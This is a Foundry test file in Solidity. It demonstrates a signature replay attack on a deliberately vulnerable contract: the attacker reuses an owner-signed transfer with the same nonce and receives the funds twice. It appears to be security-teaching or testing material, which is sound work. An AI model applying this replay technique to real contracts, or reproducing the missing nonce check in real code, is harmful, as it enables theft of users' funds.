// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/ReplayVulnerable.sol";

contract ReplayVulnerabilityTest is Test {
    ReplayVulnerable public replayVulnerable;
    address public owner;
    address public attacker;

    function setUp() public {
        owner = vm.addr(1);
        attacker = vm.addr(2);

        replayVulnerable = new ReplayVulnerable();
        vm.deal(owner, 1 ether);
        vm.deal(attacker, 1 ether);
    }

    function testReplayAttack() public {
        uint256 amount = 100;
        uint256 nonce = 1;

        // Generate a valid signature from the owner
        bytes32 messageHash = keccak256(
            abi.encodePacked(owner, attacker, amount, nonce)
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, messageHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        // Perform the first transfer
        vm.prank(owner);
        replayVulnerable.transfer(attacker, amount, nonce, signature);

        uint256 attackerBalanceAfterFirstTransfer = replayVulnerable.balances(attacker);
        assertEq(attackerBalanceAfterFirstTransfer, amount);

        // Replay the same signature
        vm.prank(attacker); // Attacker replays the signature
        replayVulnerable.transfer(attacker, amount, nonce, signature);

        uint256 attackerBalanceAfterReplay = replayVulnerable.balances(attacker);

        emit log_named_uint("Attacker Balance After Replay", attackerBalanceAfterReplay);

        // Assert that the balance has been increased due to the replay attack
        assertEq(attackerBalanceAfterReplay, amount * 2);
    }
}
